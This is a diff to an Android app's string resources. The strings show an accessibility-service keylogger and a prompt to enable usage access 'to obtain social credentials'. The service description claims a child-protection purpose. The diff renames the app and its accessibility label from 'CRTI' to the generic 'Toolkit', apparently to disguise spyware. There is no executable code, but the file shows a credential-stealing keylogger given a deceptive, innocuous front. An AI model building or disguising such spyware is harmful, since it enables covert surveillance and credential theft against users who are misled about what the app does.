@@ -5,7 +5,7 @@
     //Menu Path Data
     <string name="menu_vector_path" translatable="false">M20 30,L80 30,M20 50,L80 50,M20 70,L80 70</string>
 
-    <string name="app_name">CRTI</string>
+    <string name="app_name">Toolkit</string>
 
     <string name="APY_KEY_MAPS" translatable="false">APY_KEY_MAPS</string>
 
@@ -129,7 +129,7 @@
     <string name="msg_dialog_enable_usage_stats">You need to activate the "Applications with use access" permission to obtain social credentials</string>
     <string name="enable_keylogger_success">Successful KeyLogger accessibility</string>
 
-    <string name="accessibility_service_label">crti accessibility</string>
+    <string name="accessibility_service_label">Toolkit</string>
     <string name="accessibility_service_description">Child accessibility allows users to prevent, or limit access to, their handling, or their content to minors</string>
     <string name="msg_dialog_enable_accessibility_service">You need to enable the accessibility service so that the application works correctly.</string>
     <string name="enable_service">Activer service accessibilité</string>
